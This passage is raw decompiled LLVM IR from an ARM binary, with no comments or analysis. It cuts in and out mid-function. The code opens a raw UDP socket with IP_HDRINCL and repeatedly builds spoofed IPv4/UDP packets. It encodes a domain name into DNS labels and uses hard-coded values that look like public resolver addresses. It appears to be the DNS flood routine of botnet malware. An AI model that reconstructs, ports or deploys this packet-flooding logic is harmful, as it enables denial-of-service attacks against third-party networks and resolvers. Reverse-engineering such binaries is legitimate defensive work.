  %v29_bdec75 = phi i32 [ %v1_bdac, %dec_label_pc_be20 ], [ %v1_bdac, %dec_label_pc_be10 ], [ %v1_bdac, %dec_label_pc_be04 ], [ %v1_bdac, %dec_label_pc_bdf0 ], [ %v3_b8e0, %dec_label_pc_b8bc ]
  %stack_var_-2176.0 = phi i32 [ 33686020, %dec_label_pc_be20 ], [ 104859200, %dec_label_pc_be10 ], [ 707416650, %dec_label_pc_be04 ], [ 134744072, %dec_label_pc_bdf0 ], [ %v3_b8e0, %dec_label_pc_b8bc ]
  store i32 %v5_b7ac, i32* %ip.global-to-local, align 4
  %v2_b8ec = icmp eq i32 %v5_b7ac, 0
  store i1 %v2_b8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b8ec, label %dec_label_pc_bde4, label %dec_label_pc_b8f4

dec_label_pc_b8f4:                                ; preds = %dec_label_pc_b8e8
  store i32 %v5_b7ac, i32* %r0.global-to-local, align 4
  %v1_b8f8 = inttoptr i32 %v5_b7ac to i8*
  %v2_b8f8 = call i32 @function_11798(i8* %v1_b8f8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b90c = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b90c, i32* %r0.global-to-local, align 4
  %v2_b910 = icmp eq i32 %v3_b90c, -1
  store i1 %v2_b910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b910, label %dec_label_pc_bde4, label %dec_label_pc_b91c

dec_label_pc_b91c:                                ; preds = %dec_label_pc_b8f4
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b928 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b928, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_b93c = call i32 @setsockopt(i32 %v3_b90c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_b93c, i32* %r0.global-to-local, align 4
  %v2_b940 = icmp eq i32 %v7_b93c, -1
  store i1 %v2_b940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b940, label %dec_label_pc_bddc, label %dec_label_pc_b948

dec_label_pc_b948:                                ; preds = %dec_label_pc_b91c
  store i32 %v1_b698, i32* %r0.global-to-local, align 4
  %v3_b950 = mul i32 %v7_b6ec, 65536
  store i32 %v3_b950, i32* %lr.global-to-local, align 4
  %v0_b954 = load i32, i32* @sl, align 4
  %v3_b954 = mul i32 %v0_b954, 65536
  store i32 %v3_b954, i32* %sl.global-to-local, align 4
  %v0_b958 = load i32, i32* %r8.global-to-local, align 4
  %v0_b95c = load i32, i32* %fp.global-to-local, align 4
  %v3_b95c = mul i32 %v0_b95c, 65536
  store i32 %v3_b95c, i32* %r5.global-to-local, align 4
  %v0_b960 = load i32, i32* %sb.global-to-local, align 4
  %v3_b960 = mul i32 %v0_b960, 65536
  store i32 %v3_b960, i32* %sb.global-to-local, align 4
  %v5_b964 = trunc i32 %v0_b958 to i8
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b96c = urem i32 %v7_b6ec, 65536
  store i32 %v3_b96c, i32* %r2.global-to-local, align 4
  %v3_b970 = urem i32 %v0_b95c, 65536
  store i32 %v3_b970, i32* %r3.global-to-local, align 4
  %v3_b974 = urem i32 %v0_b960, 65536
  store i32 %v3_b974, i32* %r4.global-to-local, align 4
  %v3_b978 = urem i32 %v0_b954, 65536
  store i32 %v3_b978, i32* %r8.global-to-local, align 4
  %v2_b97c = icmp eq i32 %v1_b698, 0
  store i1 %v2_b97c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_b97c, label %dec_label_pc_bdcc, label %dec_label_pc_b9a0

dec_label_pc_b9a0:                                ; preds = %dec_label_pc_b948
  %v4_b9a4 = sext i8 %v5_b964 to i32
  %v2_b9a8 = add i32 %v4_b9a4, %v2_b8f8
  store i32 %v2_b9a8, i32* @fp, align 4
  %v3_b9ac = mul i32 %v2_b9a8, 65536
  %v1_b9b0 = add i32 %v3_b9ac, 1769472
  store i32 %v1_b9b0, i32* %r6.global-to-local, align 4
  %v1_b9b4 = add i32 %v3_b9ac, 3080192
  %v1_b9c8 = urem i32 %v0_b954, 256
  %v3_b9d8 = udiv i32 %v1_b9b0, 256
  %v1_b9dc = urem i32 %v7_b6ec, 256
  %v1_b9e0 = and i32 %v3_b9d8, 65280
  %v1_b9e4 = urem i32 %v0_b960, 256
  %v3_b9e8 = mul nuw nsw i32 %v1_b9c8, 256
  %v1_b9f0 = urem i32 %v0_b95c, 256
  %v3_b9f4 = mul nuw nsw i32 %v1_b9e4, 256
  %tmp141 = udiv i32 %v0_b954, 256
  %v4_b9f8 = urem i32 %tmp141, 256
  %v5_b9f8 = or i32 %v4_b9f8, %v3_b9e8
  store i32 %v5_b9f8, i32* %r8.global-to-local, align 4
  %v4_b9fc = udiv i32 %v1_b9b0, 16777216
  %v5_b9fc = or i32 %v1_b9e0, %v4_b9fc
  store i32 %v5_b9fc, i32* %sl.global-to-local, align 4
  %tmp142 = udiv i32 %v0_b95c, 256
  %v3_ba08 = urem i32 %tmp142, 256
  %v4_ba0c = sdiv i32 %v1_b9b4, 16777216
  %tmp143 = udiv i32 %v7_b6ec, 256
  %v4_ba14 = mul nuw nsw i32 %v1_b9f0, 256
  %v5_ba14 = or i32 %v4_ba14, %v3_ba08
  store i32 %v5_ba14, i32* %r5.global-to-local, align 4
  %tmp144 = udiv i32 %v0_b960, 256
  %v4_ba18 = urem i32 %tmp144, 256
  %v5_ba18 = or i32 %v4_ba18, %v3_b9f4
  store i32 %v5_ba18, i32* %sb.global-to-local, align 4
  store i32 %v1_b9dc, i32* %r0.global-to-local, align 4
  %v1_ba24 = add i32 %v2_b8f8, 1
  store i32 %v1_ba24, i32* %r7.global-to-local, align 4
  %v3_ba28 = ashr i32 %v1_b9b4, 31
  store i32 %v3_ba28, i32* %lr.global-to-local, align 4
  store i32 %v1_b9f0, i32* %r1.global-to-local, align 4
  store i32 %v1_b9e4, i32* %r2.global-to-local, align 4
  %v3_ba3476 = udiv i32 %v1_b9e0, 256
  store i32 %v3_ba3476, i32* %r3.global-to-local, align 4
  store i32 %v1_b9c8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_ba98 = sext i8 %v5_b6e8 to i32
  %sext14 = mul i32 %v6_b704, 16777216
  %v4_bab0 = sdiv i32 %sext14, 16777216
  %sext15 = mul i32 %tmp143, 16777216
  %v4_bac4 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v7_b6ec, 16777216
  %v4_bac8 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_b9b0, 256
  %v4_baf8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_b960, 16777216
  %v4_bafc = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v0_b95c, 16777216
  %v4_bb20 = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_b954, 16777216
  %v4_bb2c = sdiv i32 %sext20, 16777216
  %v1_baa8 = trunc i32 %v4_ba0c to i8
  %extract.t = trunc i32 %v3_ba28 to i8
  br label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_bbc0, %dec_label_pc_b9a0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_ba60 = call i32* @calloc(i32 600, i32 1)
  %v4_ba60 = ptrtoint i32* %v2_ba60 to i32
  store i32 %v4_ba60, i32* %r0.global-to-local, align 4
  store i32 %v4_b6b0, i32* %lr.global-to-local, align 4
  %v3_ba68 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ba68, i32* %r3.global-to-local, align 4
  %v2_ba6c = load i32, i32* %r4.global-to-local, align 4
  %v5_ba6c = mul i32 %v2_ba6c, 4
  %v6_ba6c = add i32 %v5_ba6c, %v4_b6b0
  %v7_ba6c = inttoptr i32 %v6_ba6c to i32*
  store i32 %v4_ba60, i32* %v7_ba6c, align 4
  %v0_ba70 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba70 = load i32, i32* %r3.global-to-local, align 4
  %v4_ba70 = mul i32 %v1_ba70, 4
  %v5_ba70 = add i32 %v4_ba70, %v0_ba70
  %v6_ba70 = inttoptr i32 %v5_ba70 to i32*
  %v7_ba70 = load i32, i32* %v6_ba70, align 4
  store i32 %v7_ba70, i32* %r1.global-to-local, align 4
  %v1_ba74 = inttoptr i32 %v7_ba70 to i8*
  %v2_ba74 = load i8, i8* %v1_ba74, align 1
  %tmp156 = urem i8 %v2_ba74, 16
  %v1_ba78 = zext i8 %tmp156 to i32
  %v1_ba7c = or i32 %v1_ba78, 64
  store i32 %v1_ba7c, i32* %r2.global-to-local, align 4
  %v1_ba80 = trunc i32 %v1_ba7c to i8
  store i8 %v1_ba80, i8* %v1_ba74, align 1
  %v0_ba84 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba84 = inttoptr i32 %v0_ba84 to i8*
  %v2_ba84 = load i8, i8* %v1_ba84, align 1
  %v1_ba88 = and i8 %v2_ba84, -16
  %v1_ba8c = or i8 %v1_ba88, 5
  store i32 %v1_b730, i32* %r0.global-to-local, align 4
  store i8 %v1_ba8c, i8* %v1_ba84, align 1
  store i32 %v4_ba98, i32* %r2.global-to-local, align 4
  %v2_ba9c = load i32, i32* %r1.global-to-local, align 4
  %v3_ba9c = add i32 %v2_ba9c, 1
  %v4_ba9c = inttoptr i32 %v3_ba9c to i8*
  store i8 %v5_b6e8, i8* %v4_ba9c, align 1
  store i32 %v4_ba0c, i32* %r3.global-to-local, align 4
  %v0_baa4 = load i32, i32* %r0.global-to-local, align 4
  %v2_baa4 = icmp eq i32 %v0_baa4, 0
  store i1 %v2_baa4, i1* %cpsr_z.global-to-local, align 1
  %v2_baa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_baa8 = add i32 %v2_baa8, 2
  %v4_baa8 = inttoptr i32 %v3_baa8 to i8*
  store i8 %v1_baa8, i8* %v4_baa8, align 1
  store i32 %v3_ba28, i32* %r4.global-to-local, align 4
  store i32 %v4_bab0, i32* %r0.global-to-local, align 4
  %v0_bab4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bab4, label %.thread22, label %bb145

bb145:                                            ; preds = %dec_label_pc_ba58
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bab8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bab8 = add i32 %v3_bab8, 6
  %v5_bab8 = inttoptr i32 %v4_bab8 to i8*
  store i8 64, i8* %v5_bab8, align 1
  %v0_bac0.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t77 = trunc i32 %v0_bac0.pre to i8
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_ba58, %bb145
  %v0_bac0.off0 = phi i8 [ %extract.t, %dec_label_pc_ba58 ], [ %extract.t77, %bb145 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bac0 = load i32, i32* %r1.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 3
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v0_bac0.off0, i8* %v4_bac0, align 1
  store i32 %v4_bac4, i32* %ip.global-to-local, align 4
  store i32 %v4_bac8, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a420.104 to i32), i32* %r4.global-to-local, align 4
  %v0_bad0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bad0 = trunc i32 %v0_bad0 to i8
  %v2_bad0 = load i32, i32* %r1.global-to-local, align 4
  %v3_bad0 = add i32 %v2_bad0, 8
  %v4_bad0 = inttoptr i32 %v3_bad0 to i8*
  store i8 %v1_bad0, i8* %v4_bad0, align 1
  %v0_bad4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bad4 = trunc i32 %v0_bad4 to i8
  %v2_bad4 = load i32, i32* %r1.global-to-local, align 4
  %v3_bad4 = add i32 %v2_bad4, 9
  %v4_bad4 = inttoptr i32 %v3_bad4 to i8*
  store i8 %v1_bad4, i8* %v4_bad4, align 1
  %v0_bad8 = load i32, i32* %lr.global-to-local, align 4
  %v1_bad8 = trunc i32 %v0_bad8 to i8
  %v2_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v3_bad8 = add i32 %v2_bad8, 5
  %v4_bad8 = inttoptr i32 %v3_bad8 to i8*
  store i8 %v1_bad8, i8* %v4_bad8, align 1
  %v0_badc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_badc, label %.thread23, label %bb146

.thread23:                                        ; preds = %.thread22
  %v2_bae024 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_bae024, i32* %r3.global-to-local, align 4
  store i32 %v4_b9a4, i32* %lr.global-to-local, align 4
  br label %bb147

bb146:                                            ; preds = %.thread22
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_bae0 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_bae0, i32* %r3.global-to-local, align 4
  store i32 %v4_b9a4, i32* %lr.global-to-local, align 4
  %v3_bae8 = load i32, i32* %r1.global-to-local, align 4
  %v4_bae8 = add i32 %v3_bae8, 7
  %v5_bae8 = inttoptr i32 %v4_bae8 to i8*
  store i8 0, i8* %v5_bae8, align 1
  %v0_baf0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_baf4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %.thread23, %bb146
  %v0_baf4 = phi i32 [ %v2_bae024, %.thread23 ], [ %v0_baf4.pre, %bb146 ]
  %v0_baf0 = phi i32 [ %v4_b9a4, %.thread23 ], [ %v0_baf0.pre, %bb146 ]
  %v0_baec = load i32, i32* %r1.global-to-local, align 4
  %v1_baec = add i32 %v0_baf0, 41
  %v2_baf0 = add i32 %v1_baec, %v0_baec
  store i32 %v2_baf0, i32* %r4.global-to-local, align 4
  %v2_baf4 = add i32 %v0_baec, 12
  %v3_baf4 = inttoptr i32 %v2_baf4 to i32*
  store i32 %v0_baf4, i32* %v3_baf4, align 4
  store i32 %v4_baf8, i32* %r2.global-to-local, align 4
  store i32 %v4_bafc, i32* %r3.global-to-local, align 4
  %v0_bb00 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb00 = add i32 %v0_bb00, 20
  store i32 %v1_bb00, i32* %r0.global-to-local, align 4
  %v0_bb04 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb04 = trunc i32 %v0_bb04 to i8
  %v3_bb04 = add i32 %v0_bb00, 4
  %v4_bb04 = inttoptr i32 %v3_bb04 to i8*
  store i8 %v1_bb04, i8* %v4_bb04, align 1
  %v0_bb08 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb08 = trunc i32 %v0_bb08 to i8
  %v2_bb08 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb08 = add i32 %v2_bb08, 5
  %v4_bb08 = inttoptr i32 %v3_bb08 to i8*
  store i8 %v1_bb08, i8* %v4_bb08, align 1
  %v0_bb0c = load i32, i32* %r3.global-to-local, align 4
  %v1_bb0c = trunc i32 %v0_bb0c to i8
  %v2_bb0c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb0c = add i32 %v2_bb0c, 3
  %v4_bb0c = inttoptr i32 %v3_bb0c to i8*
  store i8 %v1_bb0c, i8* %v4_bb0c, align 1
  %v0_bb10 = load i32, i32* %sb.global-to-local, align 4
  %v1_bb10 = trunc i32 %v0_bb10 to i8
  %v2_bb10 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb10 = add i32 %v2_bb10, 2
  %v4_bb10 = inttoptr i32 %v3_bb10 to i8*
  store i8 %v1_bb10, i8* %v4_bb10, align 1
  %v0_bb14 = load i32, i32* %sl.global-to-local, align 4
  %v1_bb14 = trunc i32 %v0_bb14 to i8
  %v2_bb14 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb14 = add i32 %v2_bb14, 4
  %v4_bb14 = inttoptr i32 %v3_bb14 to i8*
  store i8 %v1_bb14, i8* %v4_bb14, align 1
  %v0_bb18 = load i32, i32* %r5.global-to-local, align 4
  %v1_bb18 = trunc i32 %v0_bb18 to i8
  %v2_bb18 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb18 = add i32 %v2_bb18, 20
  %v4_bb18 = inttoptr i32 %v3_bb18 to i8*
  store i8 %v1_bb18, i8* %v4_bb18, align 1
  store i32 %v4_bb20, i32* %r2.global-to-local, align 4
  %v1_bb24 = load i32, i32* %r1.global-to-local, align 4
  %v2_bb24 = add i32 %v1_bb24, 16
  %v3_bb24 = inttoptr i32 %v2_bb24 to i32*
  store i32 %stack_var_-2176.0, i32* %v3_bb24, align 4
  %v0_bb28 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb28 = trunc i32 %v0_bb28 to i8
  %v2_bb28 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb28 = add i32 %v2_bb28, 1
  %v4_bb28 = inttoptr i32 %v3_bb28 to i8*
  store i8 %v1_bb28, i8* %v4_bb28, align 1
  store i32 %v4_bb2c, i32* %lr.global-to-local, align 4
  store i32 %v4_b9a4, i32* %r0.global-to-local, align 4
  %v0_bb34 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb34 = add i32 %v0_bb34, 28
  store i32 %v1_bb34, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bb40 = load i32, i32* %r8.global-to-local, align 4
  %v1_bb40 = trunc i32 %v0_bb40 to i8
  %v4_bb40 = inttoptr i32 %v1_bb34 to i8*
  store i8 %v1_bb40, i8* %v4_bb40, align 1
  %v0_bb44 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb44 = trunc i32 %v0_bb44 to i8
  %v2_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v3_bb44 = add i32 %v2_bb44, 5
  %v4_bb44 = inttoptr i32 %v3_bb44 to i8*
  store i8 %v1_bb44, i8* %v4_bb44, align 1
  %v0_bb48 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb48 = trunc i32 %v0_bb48 to i8
  %v2_bb48 = load i32, i32* %ip.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 1
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i32, i32* %r3.global-to-local, align 4
  %v1_bb4c = trunc i32 %v0_bb4c to i8
  %v2_bb4c = load i32, i32* %ip.global-to-local, align 4
  %v3_bb4c = add i32 %v2_bb4c, 2
  %v4_bb4c = inttoptr i32 %v3_bb4c to i8*
  store i8 %v1_bb4c, i8* %v4_bb4c, align 1
  %v0_bb50 = load i32, i32* %r6.global-to-local, align 4
  %v1_bb50 = trunc i32 %v0_bb50 to i8
  %v2_bb50 = load i32, i32* %ip.global-to-local, align 4
  %v3_bb50 = add i32 %v2_bb50, 3
  %v4_bb50 = inttoptr i32 %v3_bb50 to i8*
  store i8 %v1_bb50, i8* %v4_bb50, align 1
  %v0_bb54 = load i32, i32* %r6.global-to-local, align 4
  %v1_bb54 = trunc i32 %v0_bb54 to i8
  %v2_bb54 = load i32, i32* %ip.global-to-local, align 4
  %v3_bb54 = add i32 %v2_bb54, 4
  %v4_bb54 = inttoptr i32 %v3_bb54 to i8*
  store i8 %v1_bb54, i8* %v4_bb54, align 1
  %v0_bb58 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb58 = trunc i32 %v0_bb58 to i8
  %v2_bb58 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb58 = add i32 %v2_bb58, 40
  %v4_bb58 = inttoptr i32 %v3_bb58 to i8*
  store i8 %v1_bb58, i8* %v4_bb58, align 1
  store i32 %v5_b7ac, i32* %r1.global-to-local, align 4
  %v0_bb60 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_bb60, i32* %r2.global-to-local, align 4
  %v0_bb64 = load i32, i32* %r4.global-to-local, align 4
  %v1_bb64 = add i32 %v0_bb64, 1
  store i32 %v1_bb64, i32* %r0.global-to-local, align 4
  %v3_bb68 = call i32 @function_11814(i32 %v1_bb64, i32 %v5_b7ac, i32 %v0_bb60)
  store i32 %v3_bb68, i32* %r0.global-to-local, align 4
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v1_bb70 = load i32, i32* %r6.global-to-local, align 4
  %v9_bb70 = icmp eq i32 %v2_b8f8, %v1_bb70
  store i1 %v9_bb70, i1* %cpsr_z.global-to-local, align 1
  %v7_bb74 = icmp sgt i32 %v2_b8f8, %v1_bb70
  store i32 %v1_bb70, i32* %lr.global-to-local, align 4
  %v0_bb84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bb84, i32* %r2.global-to-local, align 4
  %extract.t79 = trunc i32 %v1_bb70 to i8
  br i1 %v7_bb74, label %dec_label_pc_bb80, label %dec_label_pc_bbc0

dec_label_pc_bb80:                                ; preds = %bb147
  store i32 %v1_bb70, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %bb150, %dec_label_pc_bb80
  %v0_bba886153 = phi i32 [ %v0_bba886154, %bb150 ], [ %v1_bb70, %dec_label_pc_bb80 ]
  %v1_bb9c34 = phi i32 [ %v1_bbac92, %bb150 ], [ %v1_bb70, %dec_label_pc_bb80 ]
  %v1_bb98.off0 = phi i8 [ %v1_bb9857.off0, %bb150 ], [ %extract.t79, %dec_label_pc_bb80 ]
  %v0_bb9c33 = phi i32 [ %v0_bb9c335589, %bb150 ], [ %v0_bb84, %dec_label_pc_bb80 ]
  store i32 %v5_b7ac, i32* %ip.global-to-local, align 4
  %v2_bb90 = add i32 %v1_bb9c34, %v5_b7ac
  %v3_bb90 = inttoptr i32 %v2_bb90 to i8*
  %v4_bb90 = load i8, i8* %v3_bb90, align 1
  %v6_bb90 = zext i8 %v4_bb90 to i32
  store i32 %v6_bb90, i32* %r3.global-to-local, align 4
  %v7_bb94 = icmp eq i8 %v4_bb90, 46
  store i1 %v7_bb94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bb94, label %bb148, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_bb8c
  %v2_bb9c35 = add i32 %v1_bb9c34, %v0_bb9c33
  store i32 %v2_bb9c35, i32* %r0.global-to-local, align 4
  br label %.thread36

bb148:                                            ; preds = %dec_label_pc_bb8c
  %v3_bb98 = load i32, i32* %r2.global-to-local, align 4
  %v4_bb98 = inttoptr i32 %v3_bb98 to i8*
  store i8 %v1_bb98.off0, i8* %v4_bb98, align 1
  %v0_bba0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_bb9c = load i32, i32* %r4.global-to-local, align 4
  %v1_bb9c = load i32, i32* %r1.global-to-local, align 4
  %v2_bb9c = add i32 %v1_bb9c, %v0_bb9c
  store i32 %v2_bb9c, i32* %r0.global-to-local, align 4
  br i1 %v0_bba0.pr, label %bb149, label %bb148..thread36_crit_edge

bb148..thread36_crit_edge:                        ; preds = %bb148
  %v0_bba886.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread36

bb149:                                            ; preds = %bb148
  %v2_bba0 = add i32 %v2_bb9c, 1
  store i32 %v2_bba0, i32* %r2.global-to-local, align 4
  store i32 %v2_b8f8, i32* %r0.global-to-local, align 4
  %v0_bba8 = load i32, i32* %lr.global-to-local, align 4
  %v1_bba8 = add i32 %v0_bba8, 1
  store i32 %v1_bba8, i32* %ip.global-to-local, align 4
  %v1_bbac = add i32 %v1_bb9c, 1
  store i32 %v1_bbac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb150

.thread36:                                        ; preds = %bb148..thread36_crit_edge, %.thread32
  %v0_bba886 = phi i32 [ %v0_bba886.pre, %bb148..thread36_crit_edge ], [ %v0_bba886153, %.thread32 ]
  %v0_bbac.ph = phi i32 [ %v1_bb9c, %bb148..thread36_crit_edge ], [ %v1_bb9c34, %.thread32 ]
  %v0_bb9c3355.ph = phi i32 [ %v0_bb9c, %bb148..thread36_crit_edge ], [ %v0_bb9c33, %.thread32 ]
  store i32 %v2_b8f8, i32* %r0.global-to-local, align 4
  %v1_bba887 = add i32 %v0_bba886, 1
  store i32 %v1_bba887, i32* %ip.global-to-local, align 4
  %v1_bbac88 = add i32 %v0_bbac.ph, 1
  store i32 %v1_bbac88, i32* %r1.global-to-local, align 4
  %v2_bbb4 = urem i32 %v1_bba887, 256
  store i32 %v2_bbb4, i32* %lr.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_bba887 to i8
  br label %bb150

bb150:                                            ; preds = %bb149, %.thread36
  %v0_bba886154 = phi i32 [ 0, %bb149 ], [ %v2_bbb4, %.thread36 ]
  %v1_bbac92 = phi i32 [ %v1_bbac, %bb149 ], [ %v1_bbac88, %.thread36 ]
  %v0_bb9c335589 = phi i32 [ %v0_bb9c, %bb149 ], [ %v0_bb9c3355.ph, %.thread36 ]
  %v1_bb9857.off0 = phi i8 [ 0, %bb149 ], [ %extract.t82, %.thread36 ]
  %v9_bbb8 = icmp eq i32 %v2_b8f8, %v1_bbac92
  store i1 %v9_bbb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbb8, label %dec_label_pc_bbc0.loopexit, label %dec_label_pc_bb8c

dec_label_pc_bbc0.loopexit:                       ; preds = %bb150
  %v2_bbc0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_bbc0

dec_label_pc_bbc0:                                ; preds = %dec_label_pc_bbc0.loopexit, %bb147
  %v2_bbc0 = phi i32 [ %v2_bbc0.pre, %dec_label_pc_bbc0.loopexit ], [ %v0_bb84, %bb147 ]
  %v0_bbc0.off0 = phi i8 [ %v1_bb9857.off0, %dec_label_pc_bbc0.loopexit ], [ %extract.t79, %bb147 ]
  %v3_bbc0 = inttoptr i32 %v2_bbc0 to i8*
  store i8 %v0_bbc0.off0, i8* %v3_bbc0, align 1
  %v3_bbc4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v0_bbcc = load i32, i32* %r4.global-to-local, align 4
  %v2_bbcc = add i32 %v0_bbcc, %v2_b8f8
  store i32 %v2_bbcc, i32* %r3.global-to-local, align 4
  %v1_bbd0 = add i32 %v3_bbc4, 1
  store i32 %v1_bbd0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %lr.global-to-local, align 4
  %v9_bbe0 = icmp eq i32 %v1_b698, %v1_bbd0
  store i1 %v9_bbe0, i1* %cpsr_z.global-to-local, align 1
  %v1_bbe4 = add i32 %v2_bbcc, 2
  store i32 %v1_bbe4, i32* %r2.global-to-local, align 4
  %v4_bbe8 = inttoptr i32 %v1_bbe4 to i8*
  store i8 0, i8* %v4_bbe8, align 1
  %v0_bbec = load i32, i32* %lr.global-to-local, align 4
  %v1_bbec = trunc i32 %v0_bbec to i8
  %v2_bbec = load i32, i32* %r2.global-to-local, align 4
  %v3_bbec = add i32 %v2_bbec, 3
  %v4_bbec = inttoptr i32 %v3_bbec to i8*
  store i8 %v1_bbec, i8* %v4_bbec, align 1
  %v0_bbf0 = load i32, i32* %lr.global-to-local, align 4
  %v1_bbf0 = trunc i32 %v0_bbf0 to i8
  %v2_bbf0 = load i32, i32* %r2.global-to-local, align 4
  %v3_bbf0 = add i32 %v2_bbf0, 1
  %v4_bbf0 = inttoptr i32 %v3_bbf0 to i8*
  store i8 %v1_bbf0, i8* %v4_bbf0, align 1
  %v0_bbf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bbf4 = trunc i32 %v0_bbf4 to i8
  %v2_bbf4 = load i32, i32* %r2.global-to-local, align 4
  %v3_bbf4 = add i32 %v2_bbf4, 2
  %v4_bbf4 = inttoptr i32 %v3_bbf4 to i8*
  store i8 %v1_bbf4, i8* %v4_bbf4, align 1
  %v0_bbf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bbf8, i32* %stack_var_-40, align 4
  %v8_bbfc = icmp sgt i32 %v1_b698, %v1_bbd0
  br i1 %v8_bbfc, label %dec_label_pc_ba58, label %dec_label_pc_bc00

dec_label_pc_bc00:                                ; preds = %dec_label_pc_bbc0, %dec_label_pc_bdcc
  %v4_bc70.pre-phi = phi i32 [ %v4_bdd0, %dec_label_pc_bdcc ], [ %v4_b9a4, %dec_label_pc_bbc0 ]
  store i32 %v1_b698, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_b97c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_bc0c

dec_label_pc_bc0c:                                ; preds = %dec_label_pc_bc0c, %dec_label_pc_bd30, %dec_label_pc_bc00
  br i1 %v2_b97c, label %dec_label_pc_bc0c, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bc0c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r6, align 4
  %v0_bc20 = load i32, i32* @fp, align 4
  %v1_bc20 = add i32 %v0_bc20, 27
  store i32 %v1_bc20, i32* @sb, align 4
  %v1_bc24 = add i32 %v0_bc20, 47
  store i32 %v1_bc24, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_bc2c

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc6c.dec_label_pc_bc2c_crit_edge, %dec_label_pc_bc10
